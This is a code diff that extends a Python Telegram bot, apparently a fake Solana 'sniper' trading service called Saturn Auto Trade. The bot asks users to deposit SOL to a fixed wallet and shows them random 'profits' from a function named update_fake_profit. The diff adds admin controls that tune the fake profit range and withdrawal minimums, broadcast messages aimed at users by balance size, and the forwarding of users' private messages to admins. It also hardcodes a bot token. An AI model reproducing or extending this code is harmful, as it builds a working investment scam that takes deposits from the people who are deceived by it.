@@ -7,19 +7,20 @@ import json
 import os
 import datetime
 import random
+import time
+from collections import defaultdict
 
-# ===== ADMIN MIRROR CONFIG =====
-ADMIN_ID = 6320779357           # your Telegram user ID
-ADMIN_MIRROR_ENABLED = False    # start with mirror OFF
+# ===== CORE ADMIN CONFIG =====
+PRIMARY_ADMIN_ID = 6320779357          # your main Telegram user ID
+ADMIN_MIRROR_ENABLED = False           # /admin_on, /admin_off
+LOGSTREAM_ENABLED = False              # /logstream_on, /logstream_off
 
-# ===== CONFIG =====
-BOT_TOKEN = "8359973623:AAH8rUS6EjiSoPQKdDiJ_FxuoC5dE5ddrvs"  # your bot token
+# ===== BOT CONFIG =====
+BOT_TOKEN = "8359973623:AAH8rUS6EjiSoPQKdDiJ_FxuoC5dE5ddrvs"
 DB_FILE = "saturn_db.json"
-
-# This is the public "deposit" address shown in /start and /deposit
 DEPOSIT_WALLET = "EXbk9r9P6W1UFAWAr9Mav6rLLqMWEEsVoLysKhBPsfG8"
 
-bot = telebot.TeleBot(BOT_TOKEN)
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
 
 # ===== SIMPLE JSON "DB" =====
 
@@ -41,10 +42,82 @@ def save_db():
 
 db = load_db()
 
+# ---- ensure meta section ----
+if "__meta__" not in db or not isinstance(db["__meta__"], dict):
+    db["__meta__"] = {}
+
+meta = db["__meta__"]
+meta.setdefault("admins", [str(PRIMARY_ADMIN_ID)])
+meta.setdefault("banned", [])
+meta.setdefault("sniper_min_balance", 0.25)
+meta.setdefault("profit_min", 0.002)
+meta.setdefault("profit_max", 0.01)
+meta.setdefault("withdraw_min", 0.1)
+save_db()
+
+# ===== HELPER: ADMIN / BAN / LOG =====
+
+def is_admin(user_id: int) -> bool:
+    return str(user_id) in meta.get("admins", [])
+
+def _admin_only(message) -> bool:
+    return is_admin(message.from_user.id)
+
+def is_banned(user_id: int) -> bool:
+    return str(user_id) in meta.get("banned", [])
+
+def ban_user_id(uid: int):
+    banned = set(meta.get("banned", []))
+    banned.add(str(uid))
+    meta["banned"] = list(banned)
+    save_db()
+
+def unban_user_id(uid: int):
+    banned = set(meta.get("banned", []))
+    banned.discard(str(uid))
+    meta["banned"] = list(banned)
+    save_db()
+
 def now_utc_str():
     return datetime.datetime.utcnow().strftime("%Y-%m-%d • %I:%M %p UTC")
 
-def get_user(user_id):
+def log_event(text: str):
+    """Send internal logs to admin if logstream is enabled."""
+    if not LOGSTREAM_ENABLED:
+        return
+    try:
+        for aid in meta.get("admins", []):
+            bot.send_message(int(aid), f"📝 LOG\n{text}")
+    except Exception as e:
+        print("log_event error:", e)
+
+# suspicious activity tracking (only notifies, never bans)
+user_activity = defaultdict(lambda: {"last_ts": 0.0, "count": 0})
+
+def track_activity(user_id: int, label: str):
+    now = time.time()
+    data = user_activity[user_id]
+    if now - data["last_ts"] < 2.0:
+        data["count"] += 1
+    else:
+        data["count"] = 1
+    data["last_ts"] = now
+    if data["count"] >= 6:  # threshold
+        try:
+            for aid in meta.get("admins", []):
+                bot.send_message(
+                    int(aid),
+                    f"⚠️ Suspicious activity detected\n"
+                    f"👤 User: {user_id}\n"
+                    f"🔖 Label: {label}\n"
+                    f"📊 Rapid actions count: {data['count']}"
+                )
+        except Exception as e:
+            print("track_activity notify error:", e)
+
+# ===== USER STORAGE =====
+
+def get_user(user_id: int):
     uid = str(user_id)
     if uid not in db:
         db[uid] = {
@@ -58,14 +131,20 @@ def get_user(user_id):
             "sniper_running": False,
             "main_message_id": None,
             "info_message_id": None,
-            "temp_prompt_msg_id": None
+            "temp_prompt_msg_id": None,
+            "admin_note": "",
+            "last_active": now_utc_str()
         }
-        save_db()
+    else:
+        db[uid]["last_active"] = now_utc_str()
+    save_db()
     return db[uid]
 
-def update_fake_profit(user):
+def update_fake_profit(user: dict):
     if user["sniper_running"] and user["balance"] > 0:
-        gain = user["balance"] * random.uniform(0.002, 0.01)
+        low = float(meta.get("profit_min", 0.002))
+        high = float(meta.get("profit_max", 0.01))
+        gain = user["balance"] * random.uniform(low, high)
         gain = round(gain, 4)
         user["balance"] += gain
         user["profit_total"] += gain
@@ -137,7 +216,7 @@ def send_or_update_main_message(chat_id, user):
                 parse_mode="Markdown"
             )
             return
-        except:
+        except Exception:
             pass
 
     msg = bot.send_message(
@@ -157,7 +236,7 @@ def update_info_panel(chat_id, user, text, markup=None, markdown=True):
                 text=text, reply_markup=markup, parse_mode=mode
             )
             return
-    except:
+    except Exception:
         pass
 
     msg = bot.send_message(
@@ -170,6 +249,10 @@ def update_info_panel(chat_id, user, text, markup=None, markdown=True):
 
 @bot.message_handler(commands=["start"])
 def cmd_start(message):
+    if is_banned(message.from_user.id) and not is_admin(message.from_user.id):
+        bot.reply_to(message, "🚫 You are banned from using Saturn Sniper.")
+        return
+    track_activity(message.from_user.id, "/start")
     user = get_user(message.from_user.id)
     update_fake_profit(user)
 
@@ -179,9 +262,14 @@ def cmd_start(message):
         message.chat.id, user,
         "📋 Use the buttons below the main message.\n\nChoose an option."
     )
+    log_event(f"/start used by {message.from_user.id}")
 
 @bot.message_handler(commands=["help"])
 def cmd_help(message):
+    if is_banned(message.from_user.id) and not is_admin(message.from_user.id):
+        bot.reply_to(message, "🚫 You are banned from using Saturn Sniper.")
+        return
+    track_activity(message.from_user.id, "/help")
     user = get_user(message.from_user.id)
     update_fake_profit(user)
 
@@ -189,11 +277,9 @@ def cmd_help(message):
         message.chat.id, user,
         "🛰 Saturn Auto Trade Help\n\nUse the menu buttons to navigate."
     )
+    log_event(f"/help used by {message.from_user.id}")
 
-# ===== ADMIN COMMANDS =====
-
-def _admin_only(message):
-    return message.from_user.id == ADMIN_ID
+# ===== ADMIN MIRROR & BASIC ADMIN COMMANDS =====
 
 @bot.message_handler(commands=["admin_on"])
 def admin_on(message):
@@ -217,6 +303,22 @@ def admin_off(message):
         "🔴 Admin mirror DISABLED.\nNo more messages will be forwarded."
     )
 
+@bot.message_handler(commands=["logstream_on"])
+def logstream_on(message):
+    if not _admin_only(message):
+        return
+    global LOGSTREAM_ENABLED
+    LOGSTREAM_ENABLED = True
+    bot.reply_to(message, "🟢 Logstream ENABLED.")
+
+@bot.message_handler(commands=["logstream_off"])
+def logstream_off(message):
+    if not _admin_only(message):
+        return
+    global LOGSTREAM_ENABLED
+    LOGSTREAM_ENABLED = False
+    bot.reply_to(message, "🔴 Logstream DISABLED.")
+
 @bot.message_handler(commands=["reply"])
 def admin_reply(message):
     if not _admin_only(message):
@@ -237,6 +339,8 @@ def admin_reply(message):
     except Exception as e:
         bot.reply_to(message, f"❌ Error sending: {e}")
 
+# ===== GENERIC ADMIN HELPERS =====
+
 def _get_target_user(user_id_str):
     try:
         uid = int(user_id_str)
@@ -250,6 +354,8 @@ def _parse_amount(amount_str):
         return float(amount_str), None
     except ValueError:
         return None, "Amount must be a number."
+
+# ===== EXISTING ADMIN VALUE COMMANDS =====
 
 @bot.message_handler(commands=["add_balance"])
 def admin_add_balance(message):
@@ -374,7 +480,9 @@ def admin_view_user(message):
         f"Profit Total: {user['profit_total']}\n"
         f"Sniper Running: {user['sniper_running']}\n"
         f"Main Msg ID: {user['main_message_id']}\n"
-        f"Info Msg ID: {user['info_message_id']}"
+        f"Info Msg ID: {user['info_message_id']}\n"
+        f"Admin Note: {user.get('admin_note', '')}\n"
+        f"Last Active: {user.get('last_active', 'N/A')}"
     )
     bot.reply_to(message, text)
 
@@ -405,7 +513,9 @@ def admin_reset_user(message):
         "sniper_running": False,
         "main_message_id": None,
         "info_message_id": None,
-        "temp_prompt_msg_id": None
+        "temp_prompt_msg_id": None,
+        "admin_note": "",
+        "last_active": now_utc_str()
     }
     save_db()
     bot.reply_to(message, f"✅ Reset user {uid_str} data.")
@@ -414,36 +524,481 @@ def admin_reset_user(message):
 def admin_list_users(message):
     if not _admin_only(message):
         return
-    if not db:
+    user_ids = [k for k in db.keys() if k not in ("__meta__",)]
+    if not user_ids:
         bot.reply_to(message, "No users found.")
         return
-    ids = ", ".join(db.keys())
-    bot.reply_to(message, f"👥 Users in DB:\n{ids}")
+    bot.reply_to(message, f"👥 Users in DB:\n{', '.join(user_ids)}")
 
-# ===== ADMIN MIRROR LISTENER FOR MESSAGES =====
+# ===== NEW ADMIN FEATURES =====
 
-def listener(messages):
-    if not ADMIN_MIRROR_ENABLED:
+# 1. Ban / Unban (already partly done above)
+
+@bot.message_handler(commands=["ban"])
+def cmd_ban(message):
+    if not _admin_only(message):
         return
-    for m in messages:
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "Usage: /ban <user_id>")
+        return
+    try:
+        uid = int(parts[1])
+    except ValueError:
+        bot.reply_to(message, "User ID must be a number.")
+        return
+    ban_user_id(uid)
+    bot.reply_to(message, f"✅ Banned {uid}")
+
+@bot.message_handler(commands=["unban"])
+def cmd_unban(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "Usage: /unban <user_id>")
+        return
+    try:
+        uid = int(parts[1])
+    except ValueError:
+        bot.reply_to(message, "User ID must be a number.")
+        return
+    unban_user_id(uid)
+    bot.reply_to(message, f"✅ Unbanned {uid}")
+
+# 2. Broadcast text
+
+@bot.message_handler(commands=["broadcast"])
+def cmd_broadcast(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split(" ", 1)
+    if len(parts) < 2:
+        bot.reply_to(message, "Usage: /broadcast <message>")
+        return
+    text = parts[1]
+    targets = [k for k in db.keys() if k not in ("__meta__",)]
+    sent = 0
+    for uid in targets:
+        if uid in meta.get("banned", []):
+            continue
         try:
-            if m.from_user is None:
-                continue
-            if m.from_user.id == ADMIN_ID:
-                continue
-            username = f"@{m.from_user.username}" if m.from_user.username else "None"
-            if getattr(m, "text", None):
-                content = f"💬 Text: {m.text}"
-            else:
-                content = f"📎 Message type: {m.content_type}"
-            bot.send_message(
-                ADMIN_ID,
-                f"🟦 USER MESSAGE\n"
-                f"👤 From: {m.from_user.id} ({username})\n"
-                f"{content}"
-            )
+            bot.send_message(int(uid), text)
+            sent += 1
         except Exception:
             pass
+    bot.reply_to(message, f"✅ Broadcast sent to {sent} users.")
+
+# 3. Analytics
+
+@bot.message_handler(commands=["analytics"])
+def cmd_analytics(message):
+    if not _admin_only(message):
+        return
+    total_users = 0
+    sniper_on = 0
+    total_balance = 0.0
+    total_profit = 0.0
+    for uid, data in db.items():
+        if uid == "__meta__":
+            continue
+        total_users += 1
+        total_balance += float(data.get("balance", 0))
+        total_profit += float(data.get("profit_total", 0))
+        if data.get("sniper_running"):
+            sniper_on += 1
+    text = (
+        "📊 Saturn Analytics\n\n"
+        f"👥 Total Users: {total_users}\n"
+        f"🚀 Sniper Running: {sniper_on}\n"
+        f"💰 Total Balance: {total_balance:.4f} SOL\n"
+        f"📈 Total Profit: {total_profit:.4f} SOL\n"
+    )
+    bot.reply_to(message, text)
+
+# 4. User Note
+
+@bot.message_handler(commands=["note"])
+def cmd_note(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split(" ", 2)
+    if len(parts) < 3:
+        bot.reply_to(message, "Usage: /note <user_id> <text>")
+        return
+    user, err = _get_target_user(parts[1])
+    if err:
+        bot.reply_to(message, err)
+        return
+    note_text = parts[2]
+    user["admin_note"] = note_text
+    save_db()
+    bot.reply_to(message, "✅ Note saved.")
+
+# 5. DM (priority messaging)
+
+@bot.message_handler(commands=["dm"])
+def cmd_dm(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split(" ", 2)
+    if len(parts) < 3:
+        bot.reply_to(message, "Usage: /dm <user_id> <message>")
+        return
+    try:
+        uid = int(parts[1])
+    except ValueError:
+        bot.reply_to(message, "User ID must be a number.")
+        return
+    text = parts[2]
+    try:
+        bot.send_message(uid, text)
+        bot.reply_to(message, "✅ DM sent.")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {e}")
+
+# 6. Sniper settings via chat
+
+@bot.message_handler(commands=["set_sniper_minbal"])
+def cmd_set_sniper_minbal(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "Usage: /set_sniper_minbal <amount>")
+        return
+    val, err = _parse_amount(parts[1])
+    if err:
+        bot.reply_to(message, err)
+        return
+    meta["sniper_min_balance"] = val
+    save_db()
+    bot.reply_to(message, f"✅ sniper_min_balance set to {val}")
+
+@bot.message_handler(commands=["set_profit_range"])
+def cmd_set_profit_range(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split()
+    if len(parts) != 3:
+        bot.reply_to(message, "Usage: /set_profit_range <min> <max>")
+        return
+    mn, err = _parse_amount(parts[1])
+    if err:
+        bot.reply_to(message, err)
+        return
+    mx, err = _parse_amount(parts[2])
+    if err:
+        bot.reply_to(message, err)
+        return
+    if mx <= mn:
+        bot.reply_to(message, "max must be greater than min.")
+        return
+    meta["profit_min"] = mn
+    meta["profit_max"] = mx
+    save_db()
+    bot.reply_to(message, f"✅ Profit range set to {mn} - {mx}")
+
+@bot.message_handler(commands=["set_withdraw_min"])
+def cmd_set_withdraw_min(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "Usage: /set_withdraw_min <amount>")
+        return
+    val, err = _parse_amount(parts[1])
+    if err:
+        bot.reply_to(message, err)
+        return
+    meta["withdraw_min"] = val
+    save_db()
+    bot.reply_to(message, f"✅ withdraw_min set to {val}")
+
+# 7. Fix DB
+
+@bot.message_handler(commands=["fixdb"])
+def cmd_fixdb(message):
+    if not _admin_only(message):
+        return
+    cleaned = 0
+    keys_to_delete = []
+    for k, v in list(db.items()):
+        if k == "__meta__":
+            continue
+        if not isinstance(k, str):
+            keys_to_delete.append(k)
+            continue
+        if not isinstance(v, dict):
+            keys_to_delete.append(k)
+            continue
+    for k in keys_to_delete:
+        db.pop(k, None)
+        cleaned += 1
+    save_db()
+    bot.reply_to(message, f"✅ DB cleaned. Removed {cleaned} bad entries.")
+
+# 8. Backup DB
+
+@bot.message_handler(commands=["backup_now"])
+def cmd_backup_now(message):
+    if not _admin_only(message):
+        return
+    ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+    backup_name = f"saturn_db_backup_{ts}.json"
+    try:
+        with open(backup_name, "w") as f:
+            json.dump(db, f, indent=2)
+        with open(backup_name, "rb") as f:
+            bot.send_document(message.chat.id, f)
+    except Exception as e:
+        bot.reply_to(message, f"❌ Backup failed: {e}")
+
+# 9. DB dump
+
+@bot.message_handler(commands=["db_dump"])
+def cmd_db_dump(message):
+    if not _admin_only(message):
+        return
+    try:
+        with open(DB_FILE, "rb") as f:
+            bot.send_document(message.chat.id, f)
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error sending DB: {e}")
+
+# 10. Broadcast media
+
+@bot.message_handler(commands=["broadcast_media"])
+def cmd_broadcast_media(message):
+    if not _admin_only(message):
+        return
+    msg = bot.reply_to(message, "📎 Send the media (photo/video/document/etc.) you want to broadcast.")
+    bot.register_next_step_handler(msg, handle_broadcast_media_step)
+
+def handle_broadcast_media_step(message):
+    if not is_admin(message.from_user.id):
+        return
+    targets = [k for k in db.keys() if k not in ("__meta__",)]
+    sent = 0
+    for uid in targets:
+        if uid in meta.get("banned", []):
+            continue
+        try:
+            if message.content_type == "photo":
+                file_id = message.photo[-1].file_id
+                bot.send_photo(int(uid), file_id, caption=message.caption or "")
+            elif message.content_type == "video":
+                bot.send_video(int(uid), message.video.file_id, caption=message.caption or "")
+            elif message.content_type == "document":
+                bot.send_document(int(uid), message.document.file_id, caption=message.caption or "")
+            elif message.content_type == "animation":
+                bot.send_animation(int(uid), message.animation.file_id, caption=message.caption or "")
+            elif message.content_type == "audio":
+                bot.send_audio(int(uid), message.audio.file_id, caption=message.caption or "")
+            elif message.content_type == "voice":
+                bot.send_voice(int(uid), message.voice.file_id)
+            else:
+                continue
+            sent += 1
+        except Exception:
+            pass
+    bot.reply_to(message, f"✅ Media broadcast sent to {sent} users.")
+
+# 11. Broadcast to group
+
+@bot.message_handler(commands=["broadcast_group"])
+def cmd_broadcast_group(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split(" ", 2)
+    if len(parts) < 3:
+        bot.reply_to(message, "Usage: /broadcast_group <group> <message>\nGroups: sniper_on, high_balance, low_balance, zero_balance")
+        return
+    group = parts[1]
+    text = parts[2]
+    sent = 0
+    for uid, data in db.items():
+        if uid == "__meta__" or uid in meta.get("banned", []):
+            continue
+        bal = float(data.get("balance", 0))
+        sniper = bool(data.get("sniper_running"))
+        match = False
+        if group == "sniper_on" and sniper:
+            match = True
+        elif group == "high_balance" and bal >= 1:
+            match = True
+        elif group == "low_balance" and 0 < bal < 1:
+            match = True
+        elif group == "zero_balance" and bal == 0:
+            match = True
+        if not match:
+            continue
+        try:
+            bot.send_message(int(uid), text)
+            sent += 1
+        except Exception:
+            pass
+    bot.reply_to(message, f"✅ Broadcast to group '{group}' sent to {sent} users.")
+
+# 12. Prune dead users
+
+@bot.message_handler(commands=["prune"])
+def cmd_prune(message):
+    if not _admin_only(message):
+        return
+    removed = 0
+    now = datetime.datetime.utcnow()
+    keys = list(db.keys())
+    for uid in keys:
+        if uid == "__meta__":
+            continue
+        data = db[uid]
+        if uid in meta.get("banned", []):
+            continue
+        bal = float(data.get("balance", 0))
+        dep = float(data.get("total_deposited", 0))
+        last_active = data.get("last_active")
+        try:
+            last_dt = datetime.datetime.strptime(last_active, "%Y-%m-%d • %I:%M %p UTC")
+        except Exception:
+            last_dt = now
+        days = (now - last_dt).days
+        if bal == 0 and dep == 0 and days >= 60:
+            db.pop(uid, None)
+            removed += 1
+    save_db()
+    bot.reply_to(message, f"✅ Pruned {removed} inactive users.")
+
+# 13. Multi-admin
+
+@bot.message_handler(commands=["addadmin"])
+def cmd_addadmin(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "Usage: /addadmin <user_id>")
+        return
+    try:
+        uid = int(parts[1])
+    except ValueError:
+        bot.reply_to(message, "User ID must be a number.")
+        return
+    admins = set(meta.get("admins", []))
+    admins.add(str(uid))
+    meta["admins"] = list(admins)
+    save_db()
+    bot.reply_to(message, f"✅ Added {uid} as admin.")
+
+@bot.message_handler(commands=["removeadmin"])
+def cmd_removeadmin(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "Usage: /removeadmin <user_id>")
+        return
+    try:
+        uid = int(parts[1])
+    except ValueError:
+        bot.reply_to(message, "User ID must be a number.")
+        return
+    admins = set(meta.get("admins", []))
+    if str(uid) in admins:
+        admins.discard(str(uid))
+        meta["admins"] = list(admins)
+        save_db()
+        bot.reply_to(message, f"✅ Removed {uid} from admins.")
+    else:
+        bot.reply_to(message, "User is not an admin.")
+
+@bot.message_handler(commands=["listadmins"])
+def cmd_listadmins(message):
+    if not _admin_only(message):
+        return
+    admins = meta.get("admins", [])
+    bot.reply_to(message, f"🛡 Admins:\n{', '.join(admins)}")
+
+# 14. Debug, reboot, reload_db
+
+@bot.message_handler(commands=["debug"])
+def cmd_debug(message):
+    if not _admin_only(message):
+        return
+    import sys
+    text = (
+        "🐞 Debug Info\n"
+        f"Python: {sys.version}\n"
+        f"DB entries: {len(db)}\n"
+        f"Admins: {', '.join(meta.get('admins', []))}\n"
+        f"Banned: {', '.join(meta.get('banned', []))}\n"
+        f"File: {os.path.abspath(__file__)}"
+    )
+    bot.reply_to(message, text)
+
+@bot.message_handler(commands=["reboot"])
+def cmd_reboot(message):
+    if not _admin_only(message):
+        return
+    bot.reply_to(message, "♻️ Rebooting bot process...")
+    save_db()
+    os._exit(0)
+
+@bot.message_handler(commands=["reload_db"])
+def cmd_reload_db(message):
+    if not _admin_only(message):
+        return
+    global db, meta
+    db = load_db()
+    if "__meta__" not in db or not isinstance(db["__meta__"], dict):
+        db["__meta__"] = {}
+    meta = db["__meta__"]
+    meta.setdefault("admins", [str(PRIMARY_ADMIN_ID)])
+    meta.setdefault("banned", [])
+    save_db()
+    bot.reply_to(message, "✅ DB reloaded from disk.")
+
+# ===== ADMIN MIRROR LISTENER =====
+
+def listener(messages):
+    if not messages:
+        return
+    for m in messages:
+        uid = m.from_user.id if m.from_user else None
+        if uid is None:
+            continue
+
+        # suspicious tracking (only notifies)
+        track_activity(uid, f"message:{m.content_type}")
+
+        # banned check
+        if is_banned(uid) and not is_admin(uid):
+            try:
+                bot.send_message(
+                    m.chat.id,
+                    "🚫 You are banned from using Saturn Sniper."
+                )
+            except Exception:
+                pass
+            continue
+
+        # mirror
+        if ADMIN_MIRROR_ENABLED and not is_admin(uid):
+            try:
+                username = f"@{m.from_user.username}" if m.from_user.username else "None"
+                if getattr(m, "text", None):
+                    content = f"💬 Text: {m.text}"
+                else:
+                    content = f"📎 Message type: {m.content_type}"
+                for aid in meta.get("admins", []):
+                    bot.send_message(
+                        int(aid),
+                        f"🟦 USER MESSAGE\n"
+                        f"👤 From: {uid} ({username})\n"
+                        f"{content}"
+                    )
+            except Exception:
+                pass
 
 bot.set_update_listener(listener)
 
@@ -451,19 +1006,29 @@ bot.set_update_listener(listener)
 
 @bot.callback_query_handler(func=lambda c: True)
 def callback(call):
-    user = get_user(call.from_user.id)
+    user_id = call.from_user.id
+    if is_banned(user_id) and not is_admin(user_id):
+        try:
+            bot.answer_callback_query(call.id, "🚫 You are banned.")
+        except Exception:
+            pass
+        return
+
+    track_activity(user_id, f"callback:{call.data}")
+    user = get_user(user_id)
     chat_id = call.message.chat.id
 
-    # --- ADMIN MIRROR FOR BUTTON PRESSES ---
-    if ADMIN_MIRROR_ENABLED and call.from_user.id != ADMIN_ID:
+    # Mirror button presses
+    if ADMIN_MIRROR_ENABLED and not is_admin(user_id):
         username = f"@{call.from_user.username}" if call.from_user.username else "None"
         try:
-            bot.send_message(
-                ADMIN_ID,
-                f"🟩 BUTTON PRESSED\n"
-                f"👤 From: {call.from_user.id} ({username})\n"
-                f"🆔 Callback: {call.data}"
-            )
+            for aid in meta.get("admins", []):
+                bot.send_message(
+                    int(aid),
+                    f"🟩 BUTTON PRESSED\n"
+                    f"👤 From: {user_id} ({username})\n"
+                    f"🆔 Callback: {call.data}"
+                )
         except Exception:
             pass
 
@@ -489,7 +1054,6 @@ def callback(call):
             "Press the button below to withdraw funds:"
         )
 
-        # Withdraw Funds button
         w = types.InlineKeyboardMarkup()
         w.add(types.InlineKeyboardButton("💸 Withdraw Funds", callback_data="withdraw_execute"))
         w.add(types.InlineKeyboardButton("⬅️ Back", callback_data="back_main"))
@@ -502,9 +1066,7 @@ def callback(call):
         bot.answer_callback_query(call.id)
 
         balance = user["balance"]
-
-        # MINIMUM REQUIRED — you can change this
-        MIN_REQUIRED = 0.1
+        MIN_REQUIRED = float(meta.get("withdraw_min", 0.1))
 
         if balance < MIN_REQUIRED:
             update_info_panel(
@@ -583,10 +1145,11 @@ def callback(call):
     if call.data == "sniper_start":
         bot.answer_callback_query(call.id)
 
-        if user["balance"] < 1:
+        min_bal = float(meta.get("sniper_min_balance", 0.25))
+        if user["balance"] < min_bal:
             update_info_panel(
                 chat_id, user,
-                "❌ You need at least **0.25 SOL** to start the sniper."
+                f"❌ You need at least **{min_bal} SOL** to start the sniper."
             )
         else:
             user["sniper_running"] = True
@@ -677,7 +1240,6 @@ def callback(call):
             "✏️ Send the new Solana withdrawal address:"
         )
 
-        # temp message required for next_step_handler
         temp_msg = bot.send_message(chat_id, "🔹 Reply with address:")
         user["temp_prompt_msg_id"] = temp_msg.message_id
         save_db()
@@ -700,19 +1262,17 @@ def callback(call):
 def handle_new_address(message, user_id):
     user = get_user(user_id)
 
-    # Remove the temp message
     temp = user.get("temp_prompt_msg_id")
     if temp:
         try:
             bot.delete_message(message.chat.id, temp)
-        except:
+        except Exception:
             pass
         user["temp_prompt_msg_id"] = None
         save_db()
 
     new = message.text.strip()
 
-    # Validate length only (simple)
     if len(new) < 30 or len(new) > 60:
         update_info_panel(
             message.chat.id, user,
@@ -720,7 +1280,6 @@ def handle_new_address(message, user_id):
         )
         return
 
-    # Confirm panel
     confirm_msg = (
         f"📝 New Address:\n```{new}```\n\n"
         "Save this address?"
@@ -738,6 +1297,13 @@ def handle_new_address(message, user_id):
 def address_confirm(call):
     user = get_user(call.from_user.id)
     chat_id = call.message.chat.id
+
+    if is_banned(call.from_user.id) and not is_admin(call.from_user.id):
+        try:
+            bot.answer_callback_query(call.id, "🚫 You are banned.")
+        except Exception:
+            pass
+        return
 
     if call.data.startswith("confirm_addr:"):
         new_addr = call.data.split("confirm_addr:")[1]
@@ -764,4 +1330,5 @@ def address_confirm(call):
 # ===== START BOT =====
 
 if __name__ == "__main__":
+    print("Saturn Auto Trade bot is running with extended admin features...")
     bot.polling(none_stop=True)
